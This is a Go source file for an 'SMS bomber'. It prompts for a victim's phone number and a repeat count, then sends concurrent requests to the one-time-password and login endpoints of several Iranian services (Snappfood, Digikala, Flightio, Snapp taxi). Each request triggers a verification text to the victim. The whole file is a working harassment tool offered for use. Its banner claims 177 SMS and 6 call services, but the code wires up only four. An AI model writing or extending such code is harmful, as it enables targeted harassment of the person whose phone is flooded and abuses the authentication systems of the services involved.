package main

import (
	"bytes"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"encoding/json"
	"io/ioutil"
	"time"
)

func sms(url string, payload map[string]interface{}, ch chan<- int) {
	jsonData, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("\033[01;31m[-] Error marshaling JSON for", url, "!", err)
		ch <- http.StatusInternalServerError
		return
	}

	if url == "https://flightio.com/bff/Authentication/CheckUserKey" {
		req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Println("\033[01;31m[-] Error creating request for Flightio!", err)
			ch <- http.StatusInternalServerError
			return
		}
		headers := map[string]string{
			"Accept":          "application/json, text/javascript, text/plain, text/html, application/vnd.ms-excel",
			"Accept-Encoding": "gzip, deflate, br, zstd",
			"Accept-Language": "fa_IR",
			"App-Type":        "desktop-browser",
			"Cache-Control":   "no-cache",
			"Client-V":        "10.30.2",
			"Content-Length":  fmt.Sprintf("%d", len(jsonData)),
			"Content-Type":    "application/json",
			"Cookie":          "YOUR_COOKIE_HERE", // کوکی واقعی خود را اینجا قرار دهید
			"Devicetype":      "Windows",
			"F-Lang":          "fa",
			"F-Ses-Id":        "YOUR_SESSION_ID_HERE", // شناسه جلسه واقعی خود را در صورت نیاز اینجا قرار دهید
			"Origin":          "https://flightio.com",
			"Pragma":          "no-cache",
			"Priority":        "u=1, i",
			"Referer":         "https://flightio.com/",
			"Sec-Ch-Ua":       "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
			"Sec-Ch-Ua-Mobile": "?0",
			"Sec-Ch-Ua-Platform": "\"Windows\"",
			"Sec-Fetch-Dest":  "empty",
			"Sec-Fetch-Mode":  "cors",
			"Sec-Fetch-Site":  "same-origin",
		}

		for key, value := range headers {
			req.Header.Set(key, value)
		}

		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("\033[01;31m[-] Error sending request to Flightio!", err)
			ch <- http.StatusInternalServerError
			return
		}
		defer resp.Body.Close()

		fmt.Println("Flightio Status Code:", resp.StatusCode)
		bodyBytes, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("Error reading Flightio response body:", err)
			return
		}
		fmt.Println("Flightio Response Body:", string(bodyBytes))
		ch <- resp.StatusCode
	} else {
		// منطق موجود برای سایر سرویس‌ها
		resp, err := http.Post(url, "application/x-www-form-urlencoded", strings.NewReader(payload["cellphone"].(string))) // بر اساس payload واقعی تنظیم کنید
		if err != nil {
			fmt.Println("\033[01;31m[-] Error sending request to", url, "!", err)
			ch <- http.StatusInternalServerError
			return
		}
		defer resp.Body.Close()
		ch <- resp.StatusCode
	}
}

func main() {
	var phone string
	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	fmt.Scan(&phone)
	formattedPhone := "98-" + phone

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	ch := make(chan int)

	for i := 0; i < repeatCount; i++ {
		formData := url.Values{}
		formData.Set("cellphone", phone)
		requestBody := strings.NewReader(formData.Encode())
		go func() {
			resp, err := http.Post("https://s.n.a.p.p.food.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=0d436e7f-7345-4ed5-a283-01a8956b5fd4&locale=fa", "application/x-www-form-urlencoded", requestBody)
			if err != nil {
				fmt.Println("\033[01;31m[-] Error while sending request to Snappfood!\033[0m")
				ch <- http.StatusInternalServerError
				return
			}
			defer resp.Body.Close()
			ch <- resp.StatusCode
		}()
		go sms("https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{
			"username": phone,
		}, ch)

		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
			"userKey":     formattedPhone,
			"userKeyType": 1,
		}, ch)
		go sms("https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp", map[string]interface{}{
			"cellphone": phone,
		}, ch)
	} // Closing brace for the first for loop

	for i := 0; i < repeatCount*4; i++ { // Corrected the multiplier to match the number of go routines
		statusCode := <-ch
		if statusCode == 404 || statusCode == 400 {
			fmt.Println("\033[01;31m[-] Error ! ")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
